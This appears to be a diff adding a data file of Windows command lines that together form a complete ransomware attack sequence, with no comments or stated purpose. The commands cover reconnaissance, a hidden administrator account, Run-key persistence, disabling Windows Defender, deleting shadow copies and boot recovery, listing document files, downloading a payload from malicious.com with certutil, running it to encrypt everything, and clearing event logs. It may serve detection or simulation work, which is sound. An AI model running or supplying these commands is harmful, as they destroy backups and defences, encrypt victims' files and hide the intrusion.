@@ -1,0 +1,25 @@
+commandline
+systeminfo
+net config workstation
+net view
+dir C:\Users\
+"wmic logicaldisk get size,freespace,caption"
+whoami /all
+net localgroup administrators
+"accesschk.exe -uwcqv ""Authenticated Users"" * /accepteula"
+net user ransomuser StrongPass123! /add
+net localgroup administrators ransomuser /add
+"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"" /v Ransomware /t REG_SZ /d ""C:\temp\encrypt.exe"" /f"
+sc stop WinDefend
+"reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
+vssadmin delete shadows /all /quiet
+bcdedit /set {default} recoveryenabled No
+bcdedit /set {default} bootstatuspolicy ignoreallfailures
+net use Z: \\server\shared_folder /user:domain\user password
+"powershell -Command ""Get-ChildItem -Path C:\ -Include *.docx,*.pdf,*.xls,*.xlsx,*.ppt,*.pptx -Recurse | Select-Object FullName"""
+"certutil.exe -urlcache -split -f ""http://malicious.com/ransomware.exe"" C:\temp\encrypt.exe"
+C:\temp\encrypt.exe --encrypt-all
+del C:\temp\encrypt.exe
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
